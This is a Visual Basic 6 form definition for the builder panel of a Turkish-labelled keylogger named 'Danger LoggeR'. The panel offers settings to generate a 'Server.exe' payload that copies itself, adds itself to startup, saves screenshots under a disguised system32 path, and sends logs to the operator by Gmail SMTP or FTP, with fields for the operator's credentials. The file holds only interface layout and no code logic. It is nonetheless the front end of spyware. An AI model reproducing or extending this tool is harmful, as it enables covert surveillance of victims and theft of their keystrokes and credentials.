VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.0#0"; "ActiveX.ocx"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Panel 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Danger LoggeR v.1 // _DangerOusMaN_"
   ClientHeight    =   8295
   ClientLeft      =   45
   ClientTop       =   420
   ClientWidth     =   10320
   Icon            =   "Panel.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8295
   ScaleWidth      =   10320
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text10 
      Height          =   285
      Left            =   6240
      TabIndex        =   56
      Text            =   "Text10"
      Top             =   5520
      Width           =   3495
   End
   Begin XtremeSuiteControls.GroupBox GroupBox9 
      Height          =   855
      Left            =   6240
      TabIndex        =   53
      Top             =   4560
      Width           =   1815
      _Version        =   851968
      _ExtentX        =   3201
      _ExtentY        =   1508
      _StockProps     =   79
      Caption         =   "Gönderme Seçeneði"
      BackColor       =   16777215
      UseVisualStyle  =   -1  'True
      Begin VB.TextBox Text7 
         Height          =   285
         Left            =   120
         TabIndex        =   55
         Top             =   480
         Width           =   1575
      End
      Begin VB.TextBox Text6 
         Height          =   285
         Left            =   120
         TabIndex        =   54
         Top             =   240
         Width           =   1575
      End
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   6240
      TabIndex        =   51
      Top             =   4200
      Width           =   3495
   End
   Begin XtremeSuiteControls.GroupBox GroupBox8 
      Height          =   1095
      Left            =   6240
      TabIndex        =   48
      Top             =   2640
      Width           =   1815
      _Version        =   851968
      _ExtentX        =   3201
      _ExtentY        =   1931
      _StockProps     =   79
      Caption         =   "Baþlangýç-Ekran-Save"
      BackColor       =   16777215
      UseVisualStyle  =   -1  'True
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   120
         TabIndex        =   52
         Text            =   "Text5"
         Top             =   720
         Width           =   1575
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   120
         TabIndex        =   50
         Text            =   "Text3"
         Top             =   480
         Width           =   1575
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   49
         Text            =   "Text1"
         Top             =   240
         Width           =   1575
      End
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   6240
      TabIndex        =   46
      Top             =   3840
      Width           =   3495
   End
   Begin VB.Timer Timer 
      Interval        =   150
      Left            =   6840
      Top             =   2040
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   6240
      Top             =   2040
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      Protocol        =   2
      RemotePort      =   21
      URL             =   "ftp://"
   End
   Begin XtremeSuiteControls.PushButton PushButton6 
      Height          =   405
      Left            =   3480
      TabIndex        =   44
      Top             =   6645
      Width           =   975
      _Version        =   851968
      _ExtentX        =   1720
      _ExtentY        =   714
      _StockProps     =   79
      Caption         =   "Hakkýnda"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.PushButton PushButton5 
      Height          =   405
      Left            =   4560
      TabIndex        =   43
      Top             =   6645
      Width           =   975
      _Version        =   851968
      _ExtentX        =   1720
      _ExtentY        =   714
      _StockProps     =   79
      Caption         =   "Çýkýþ"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.PushButton PushButton4 
      Height          =   405
      Left            =   240
      TabIndex        =   42
      Top             =   6645
      Width           =   1455
      _Version        =   851968
      _ExtentX        =   2566
      _ExtentY        =   714
      _StockProps     =   79
      Caption         =   "Server Oluþtur."
      BackColor       =   65535
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.GroupBox GroupBox4 
      Height          =   2295
      Left            =   240
      TabIndex        =   28
      Top             =   4200
      Width           =   5250
      _Version        =   851968
      _ExtentX        =   9260
      _ExtentY        =   4048
      _StockProps     =   79
      Caption         =   "[ Ayarlar ]"
      ForeColor       =   -2147483635
      BackColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
      Begin XtremeSuiteControls.PushButton PushButton3 
         Height          =   240
         Left            =   4680
         TabIndex        =   41
         Top             =   2000
         Width           =   375
         _Version        =   851968
         _ExtentX        =   661
         _ExtentY        =   432
         _StockProps     =   79
         Caption         =   "Seç"
         BackColor       =   -2147483635
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit11 
         Height          =   240
         Left            =   240
         TabIndex        =   40
         Top             =   2000
         Width           =   4335
         _Version        =   851968
         _ExtentX        =   7646
         _ExtentY        =   423
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "C:\WINDOWS\system32\shell\winnt368\winnt367\winnt376\Screen"
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.CheckBox CheckBox6 
         Height          =   255
         Left            =   240
         TabIndex        =   38
         Top             =   1450
         Width           =   2175
         _Version        =   851968
         _ExtentX        =   3836
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Ekran Göntüsünü Kaydet."
         BackColor       =   16777215
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   6
      End
      Begin XtremeSuiteControls.GroupBox GroupBox7 
         Height          =   1575
         Left            =   2490
         TabIndex        =   34
         Top             =   240
         Width           =   2655
         _Version        =   851968
         _ExtentX        =   4683
         _ExtentY        =   2778
         _StockProps     =   79
         Caption         =   "[ LoggeR Seçenekleri ]"
         ForeColor       =   8421504
         BackColor       =   16777215
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin VB.PictureBox Picture1 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            ForeColor       =   &H80000008&
            Height          =   570
            Left            =   1800
            ScaleHeight     =   540
            ScaleWidth      =   705
            TabIndex        =   47
            Top             =   480
            Width           =   735
         End
         Begin XtremeSuiteControls.PushButton PushButton7 
            Height          =   255
            Left            =   1800
            TabIndex        =   45
            Top             =   200
            Width           =   735
            _Version        =   851968
            _ExtentX        =   1296
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "icon Seç"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox CheckBox5 
            Height          =   255
            Left            =   120
            TabIndex        =   37
            Top             =   1110
            Width           =   2415
            _Version        =   851968
            _ExtentX        =   4260
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Server Kendini Kopyalasýn mý ?"
            BackColor       =   16777215
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
         End
         Begin XtremeSuiteControls.FlatEdit FlatEdit9 
            Height          =   255
            Left            =   120
            TabIndex        =   36
            Top             =   480
            Width           =   1605
            _Version        =   851968
            _ExtentX        =   2831
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Text            =   "Server.exe"
            Appearance      =   4
            UseVisualStyle  =   0   'False
         End
         Begin VB.Line Line2 
            BorderColor     =   &H00C0C0C0&
            X1              =   120
            X2              =   2520
            Y1              =   1440
            Y2              =   1440
         End
         Begin VB.Line Line1 
            BorderColor     =   &H00C0C0C0&
            X1              =   120
            X2              =   2520
            Y1              =   1080
            Y2              =   1080
         End
         Begin VB.Label Label12 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Server Adý :"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000D&
            Height          =   255
            Left            =   120
            TabIndex        =   35
            Top             =   240
            Width           =   855
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox6 
         Height          =   435
         Left            =   120
         TabIndex        =   32
         Top             =   1020
         Width           =   2295
         _Version        =   851968
         _ExtentX        =   4048
         _ExtentY        =   767
         _StockProps     =   79
         BackColor       =   16777215
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.CheckBox CheckBox3 
            Height          =   255
            Left            =   120
            TabIndex        =   33
            Top             =   120
            Width           =   2055
            _Version        =   851968
            _ExtentX        =   3625
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Baþlangýca Ekle"
            BackColor       =   16777215
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox5 
         Height          =   800
         Left            =   120
         TabIndex        =   29
         Top             =   240
         Width           =   2295
         _Version        =   851968
         _ExtentX        =   4048
         _ExtentY        =   1411
         _StockProps     =   79
         Caption         =   "[ Log Gönderim Seçenekleri ]"
         ForeColor       =   8421504
         BackColor       =   16777215
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.RadioButton Radio2 
            Height          =   255
            Left            =   100
            TabIndex        =   31
            Top             =   480
            Width           =   2165
            _Version        =   851968
            _ExtentX        =   3819
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "FTP Adresime Gönder"
            ForeColor       =   -2147483635
            BackColor       =   16777215
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
         End
         Begin XtremeSuiteControls.RadioButton Radio1 
            Height          =   255
            Left            =   100
            TabIndex        =   30
            Top             =   240
            Width           =   2165
            _Version        =   851968
            _ExtentX        =   3819
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Mail Adresime Gönder"
            ForeColor       =   -2147483635
            BackColor       =   16777215
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Value           =   -1  'True
         End
      End
      Begin VB.Label Label14 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Resimlerin Kayýt Yolu :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   240
         TabIndex        =   39
         Top             =   1750
         Width           =   1695
      End
   End
   Begin XtremeSuiteControls.GroupBox GroupBox1 
      Height          =   300
      Left            =   2445
      TabIndex        =   1
      Top             =   1920
      Width           =   3050
      _Version        =   851968
      _ExtentX        =   5380
      _ExtentY        =   529
      _StockProps     =   79
      BackColor       =   16777215
      UseVisualStyle  =   -1  'True
      BorderStyle     =   2
   End
   Begin XtremeSuiteControls.TabControl TabControl1 
      Height          =   2295
      Left            =   240
      TabIndex        =   0
      Top             =   1920
      Width           =   5250
      _Version        =   851968
      _ExtentX        =   9260
      _ExtentY        =   4048
      _StockProps     =   68
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Color           =   8
      PaintManager.BoldSelected=   -1  'True
      PaintManager.HotTracking=   -1  'True
      ItemCount       =   2
      SelectedItem    =   1
      Item(0).Caption =   "[ Mail Test ]"
      Item(0).ControlCount=   13
      Item(0).Control(0)=   "Label1"
      Item(0).Control(1)=   "Label2"
      Item(0).Control(2)=   "Label3"
      Item(0).Control(3)=   "Label4"
      Item(0).Control(4)=   "FlatEdit1"
      Item(0).Control(5)=   "FlatEdit2"
      Item(0).Control(6)=   "FlatEdit3"
      Item(0).Control(7)=   "CheckBox1"
      Item(0).Control(8)=   "FlatEdit4"
      Item(0).Control(9)=   "PushButton1"
      Item(0).Control(10)=   "GroupBox2"
      Item(0).Control(11)=   "Label5(0)"
      Item(0).Control(12)=   "Label6"
      Item(1).Caption =   "[ Ftp Test ]"
      Item(1).ControlCount=   13
      Item(1).Control(0)=   "Label7"
      Item(1).Control(1)=   "Label8"
      Item(1).Control(2)=   "Label9"
      Item(1).Control(3)=   "Label10"
      Item(1).Control(4)=   "FlatEdit5"
      Item(1).Control(5)=   "FlatEdit6"
      Item(1).Control(6)=   "FlatEdit8"
      Item(1).Control(7)=   "GroupBox3"
      Item(1).Control(8)=   "CheckBox2"
      Item(1).Control(9)=   "PushButton2"
      Item(1).Control(10)=   "Label5(1)"
      Item(1).Control(11)=   "Label11"
      Item(1).Control(12)=   "FlatEdit"
      Begin XtremeSuiteControls.PushButton PushButton2 
         Height          =   255
         Left            =   3600
         TabIndex        =   25
         Top             =   1620
         Width           =   1575
         _Version        =   851968
         _ExtentX        =   2778
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "FTP Test"
         BackColor       =   -2147483635
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox CheckBox2 
         Height          =   255
         Left            =   3600
         TabIndex        =   24
         Top             =   1200
         Width           =   975
         _Version        =   851968
         _ExtentX        =   1720
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Göster"
         BackColor       =   16777215
         Appearance      =   6
      End
      Begin XtremeSuiteControls.GroupBox GroupBox3 
         Height          =   30
         Left            =   0
         TabIndex        =   23
         Top             =   1920
         Width           =   5295
         _Version        =   851968
         _ExtentX        =   9340
         _ExtentY        =   53
         _StockProps     =   79
         Appearance      =   6
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit 
         Height          =   255
         Left            =   1320
         TabIndex        =   21
         Top             =   1200
         Width           =   2175
         _Version        =   851968
         _ExtentX        =   3836
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         PasswordChar    =   "*"
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit5 
         Height          =   255
         Left            =   1320
         TabIndex        =   20
         Top             =   480
         Width           =   3855
         _Version        =   851968
         _ExtentX        =   6800
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit6 
         Height          =   255
         Left            =   1320
         TabIndex        =   19
         Top             =   840
         Width           =   2535
         _Version        =   851968
         _ExtentX        =   4471
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.GroupBox GroupBox2 
         Height          =   30
         Left            =   -70000
         TabIndex        =   12
         Top             =   1920
         Visible         =   0   'False
         Width           =   5295
         _Version        =   851968
         _ExtentX        =   9340
         _ExtentY        =   53
         _StockProps     =   79
         Appearance      =   6
      End
      Begin XtremeSuiteControls.PushButton PushButton1 
         Height          =   255
         Left            =   -66400
         TabIndex        =   11
         Top             =   1620
         Visible         =   0   'False
         Width           =   1575
         _Version        =   851968
         _ExtentX        =   2778
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Test Mail Gönder"
         BackColor       =   -2147483635
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox CheckBox1 
         Height          =   255
         Left            =   -66400
         TabIndex        =   9
         Top             =   840
         Visible         =   0   'False
         Width           =   855
         _Version        =   851968
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Göster"
         BackColor       =   16777215
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   6
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit3 
         Height          =   255
         Left            =   -68800
         TabIndex        =   8
         Top             =   1200
         Visible         =   0   'False
         Width           =   1935
         _Version        =   851968
         _ExtentX        =   3413
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "smtp.gmail.com"
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit2 
         Height          =   255
         Left            =   -68800
         TabIndex        =   7
         Top             =   840
         Visible         =   0   'False
         Width           =   2295
         _Version        =   851968
         _ExtentX        =   4048
         _ExtentY        =   450
         _StockProps     =   77
         ForeColor       =   0
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         PasswordChar    =   "*"
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit1 
         Height          =   255
         Left            =   -68800
         TabIndex        =   6
         Top             =   480
         Visible         =   0   'False
         Width           =   3975
         _Version        =   851968
         _ExtentX        =   7011
         _ExtentY        =   450
         _StockProps     =   77
         ForeColor       =   0
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit4 
         Height          =   255
         Left            =   -68800
         TabIndex        =   10
         Top             =   1560
         Visible         =   0   'False
         Width           =   855
         _Version        =   851968
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "465"
         Alignment       =   2
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit8 
         Height          =   255
         Left            =   1320
         TabIndex        =   22
         Top             =   1560
         Width           =   855
         _Version        =   851968
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "21"
         Alignment       =   2
         Appearance      =   4
         UseVisualStyle  =   0   'False
      End
      Begin VB.Label Label11 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   1320
         TabIndex        =   27
         Top             =   1995
         Width           =   3735
      End
      Begin VB.Label Label5 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         Caption         =   "Durum :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   26
         Top             =   1995
         Width           =   1095
      End
      Begin VB.Label Label10 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         Caption         =   "Port :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   1560
         Width           =   1095
      End
      Begin VB.Label Label9 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         Caption         =   "Parola :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   17
         Top             =   1200
         Width           =   1095
      End
      Begin VB.Label Label8 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Kullanýcý Adý :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   840
         Width           =   1095
      End
      Begin VB.Label Label7 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         Caption         =   "Host:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   600
         TabIndex        =   15
         Top             =   480
         Width           =   615
      End
      Begin VB.Label Label6 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -69160
         TabIndex        =   14
         Top             =   1995
         Visible         =   0   'False
         Width           =   4215
      End
      Begin VB.Label Label5 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Durum :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Index           =   0
         Left            =   -69880
         TabIndex        =   13
         Top             =   1995
         Visible         =   0   'False
         Width           =   735
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         Caption         =   "Port :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   -69400
         TabIndex        =   5
         Top             =   1560
         Visible         =   0   'False
         Width           =   615
      End
      Begin VB.Label Label3 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         Caption         =   "SMTP :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   -69520
         TabIndex        =   4
         Top             =   1200
         Visible         =   0   'False
         Width           =   735
      End
      Begin VB.Label Label2 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         Caption         =   "Þifre :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   -69400
         TabIndex        =   3
         Top             =   840
         Visible         =   0   'False
         Width           =   615
      End
      Begin VB.Label Label1 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Mail Adresi :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   -69880
         TabIndex        =   2
         Top             =   480
         Visible         =   0   'False
         Width           =   1095
      End
   End
   Begin XtremeSuiteControls.CommonDialog Cmd4 
      Left            =   8040
      Top             =   2040
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog Cmd3 
      Left            =   7800
      Top             =   2040
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog Cmd2 
      Left            =   7560
      Top             =   2040
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog Cmd1 
      Left            =   7320
      Top             =   2040
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin VB.Image Image1 
      Height          =   7470
      Left            =   0
      Picture         =   "Panel.frx":2EA5A
      Top             =   0
      Width           =   10905
   End
End
Attribute VB_Name = "Panel"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
